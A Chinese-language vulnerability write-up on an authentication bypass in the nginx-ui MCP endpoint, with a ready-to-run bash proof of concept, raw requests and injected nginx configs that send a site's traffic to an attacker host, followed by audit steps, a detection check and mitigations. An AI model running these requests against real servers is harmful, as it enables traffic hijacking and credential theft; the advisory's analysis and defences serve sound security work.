🐱‍💻 漏洞概述

CVE-2026-33032 (CVSS 9.8) 是 nginx-ui 中一个认证完全缺失的严重漏洞。MCP (Model Context Protocol) 端点 /mcp_message 完全绕过了 nginx-ui 的JWT/Session认证机制，结合 CVE-2026-27944 的 MCP 通道命令注入，攻击者仅需 2 个 HTTP 请求即可完全接管 Nginx 服务器——控制所有反向代理路由、SSL 证书、上游服务器配置。

⚡ 一句话总结：管理面板加了完整认证→后加的AI/MCP功能模块漏了认证→MCP指令直接注入Nginx配置→控制所有经过该Nginx的流量

该漏洞已被 CISA 添加到 KEV（已知在野利用）目录，表明攻击者已在实际环境中利用此漏洞。

🔌 MCP协议与攻击面

MCP (Model Context Protocol) 是 Anthropic 提出的标准化协议，用于让 AI 模型调用外部工具和服务。它本质上是一个JSON-RPC over HTTP/stdio的协议，核心能力是：

  • tools/list — 枚举可用工具
  • tools/call — 调用指定工具执行操作

nginx-ui 为了「AI辅助管理」的功能，集成了 MCP 端点，允许 AI 助手直接操作 Nginx 配置。问题是：

// nginx-ui 路由结构（简化）
router.Group("/api") {
    // ✅ 有认证中间件
    router.Use(authMiddleware)
    router.POST("/nginx/config", updateConfig)
    router.POST("/nginx/reload", reloadNginx)
}

// ❌ MCP端点 — 独立路由组，无认证！
router.Group("/mcp_message") {
    // 没有 authMiddleware
    router.POST("/", handleMCP)  // 直接暴露
}

MCP 端点被注册在一个独立的路由组中，开发者的认证中间件只覆盖了原有的 /api 路由组——新增的 MCP 功能模块完全在认证范围之外。

⛓️ 攻击链分析

完整的攻击仅需两步：

Step 1：通过MCP端点认证旁路获取操作权限

POST /mcp_message HTTP/1.1
Host: target-nginx-ui:8080
Content-Type: application/json

{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "write_config",
    "arguments": {
      "path": "/etc/nginx/nginx.conf",
      "content": "..."
    }
  },
  "id": 1
}

这个请求不需要任何认证token——直接到达 MCP handler，跳过了 JWT 验证、session 检查、CSRF 保护。

Step 2：注入恶意Nginx配置

# 攻击者注入的恶意配置片段
location /api/ {
    proxy_pass http://attacker-server:9999/;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
}

# 或者更隐蔽：修改upstream指向攻击者
upstream backend {
    server attacker-server:9999;  # 替换原有后端
}

通过 MCP 的 write_config 工具修改 Nginx 配置后，调用 reload_nginx 工具使配置生效。至此，攻击者完全控制了 Nginx 的流量路由。

💥 PoC利用

完整的利用过程：

#!/bin/bash
# CVE-2026-33032 MCP Auth Bypass → Nginx Takeover PoC
TARGET="http://target:8080"

# Step 1: 枚举MCP可用工具（确认端点存在且无认证）
curl -s "$TARGET/mcp_message" -H 'Content-Type: application/json' -d '{
  "jsonrpc":"2.0","method":"tools/list","id":1
}' | jq '.result.tools[].name'

# Step 2: 通过MCP写入恶意Nginx配置
MALICIOUS_CFG='server { listen 80; location / { proxy_pass http://ATTACKER:9999/; } }'
curl -s "$TARGET/mcp_message" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"tools/call\",
  \"params\":{\"name\":\"write_config\",\"arguments\":{\"path\":\"/etc/nginx/conf.d/backdoor.conf\",\"content\":\"$MALICIOUS_CFG\"}},
  \"id\":2
}"

# Step 3: Reload Nginx使配置生效
curl -s "$TARGET/mcp_message" -H 'Content-Type: application/json' -d '{
  "jsonrpc":"2.0","method":"tools/call",
  "params":{"name":"reload_nginx","arguments":{}},
  "id":3
}'

⚠️ 影响远超Web Shell：控制 Nginx 配置 = 控制所有反向代理路由、SSL 证书、上游服务器、访问日志。攻击者可以实现大规模中间人、流量劫持、凭证窃取，且不留明显痕迹

🔄 系统性漏洞模式：新功能模块认证遗漏

这不是个案——「新功能模块绕过原有认证中间件」是一个系统性的架构缺陷：

案例 场景 根因
CVE-2026-33032 nginx-ui MCP端点 新增AI功能模块未挂载认证中间件
Nuxt DevTools RPC Vite HMR WebSocket DevTools RPC的2个方法跳过了ensureDevAuthToken
CVE-2026-70478 Flowise OAuth token refresh 自动化端点加入WHITELIST_URLS免除认证
事件分派器无认证调度 静态方法路由 事件分派器默认信任所有调用者

共同模式：认证中间件是按路由组/模块逐步添加的，而非全局默认启用。新增功能时，开发者容易忘记在新路由组上挂载认证。

审计方法论

对任何管理面板执行以下检查：

  1. 路由枚举：列出所有 HTTP 端点（包括 WebSocket、MCP、gRPC）
  2. 认证覆盖检查：对比「哪些端点有认证中间件」vs「所有暴露的端点」
  3. 新功能模块重点审计：AI/MCP/WebSocket 等后加的功能模块是认证遗漏的高发区
  4. 白名单审计：检查 WHITELIST_URLS/PUBLIC_ROUTES 中是否有敏感操作端点

🛡️ 防御方案

针对此类漏洞的防御：

架构层

  • 全局默认认证：所有路由默认需要认证，仅白名单特定端点为公开
  • 新功能模块安全审计：每次添加新路由组时，必须显式声明认证策略
  • 网络层隔离：MCP端点不应暴露到外部网络，限制为localhost或内部网络

检测层

# 检测MCP端点是否可被未认证访问
curl -s -o /dev/null -w "%{http_code}" "$TARGET/mcp_message" \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tools/list","id":1}'
# 返回200 = 漏洞存在
# 返回401/403 = 已修复

修复

  • 升级 nginx-ui 到修复版本（CVE-2026-33032 补丁后）
  • 临时缓解：通过 Web 应用防火墙阻止 /mcp_message 路径
  • 审计所有使用 MCP 集成的管理面板（Caddy UI、Traefik Dashboard 等）
